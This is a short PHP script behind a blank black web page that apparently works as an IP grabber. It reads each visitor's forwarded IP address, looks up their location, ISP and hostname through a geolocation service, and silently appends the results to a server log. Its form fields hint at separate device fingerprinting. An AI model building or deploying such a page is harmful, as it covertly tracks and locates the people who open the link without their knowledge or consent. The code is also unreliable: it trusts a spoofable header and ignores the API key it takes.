<?php
$apiKey = ''; // Replace with your actual IPinfo API key

function getIpInfo($ip, $apiKey) {
    $url = "https://ipinfo.io/{$ip}/json";
    $ipinfo = file_get_contents($url);
    return json_decode($ipinfo, true);
}

function displayIpInfo($ipinfo_json) {
    $output = <<<END
ip              :   {$_SERVER['HTTP_X_FORWARDED_FOR']}
country         :   {$ipinfo_json['country']}
city            :   {$ipinfo_json['city']}
region          :   {$ipinfo_json['region']}
loc             :   {$ipinfo_json['loc']}
postal          :   {$ipinfo_json['postal']}
org             :   {$ipinfo_json['org']}
Timezone        :   {$ipinfo_json['timezone']}
hostname        :   {$ipinfo_json['hostname']}

END;
    return $output;
}

function saveIpInfoToFile($ipinfo_str) {
    $file_path = '/etc/Magicals/Database.log';
    file_put_contents($file_path, $ipinfo_str, FILE_APPEND);
}

// Check if it's an AJAX request
if (!isset($_POST['resolution']) && !isset($_POST['batteryInfo']) && !isset($_POST['isTouchScreen'])) {
    // It's not an AJAX request, save IP information
    $visitor_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $ipinfo_json = getIpInfo($visitor_ip, $apiKey);
    $ipinfo_str = displayIpInfo($ipinfo_json);
    saveIpInfoToFile($ipinfo_str);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        body {
            background-color: black;
            color: white;
        }
    </style>
</head>
<body>
</body>
</html>
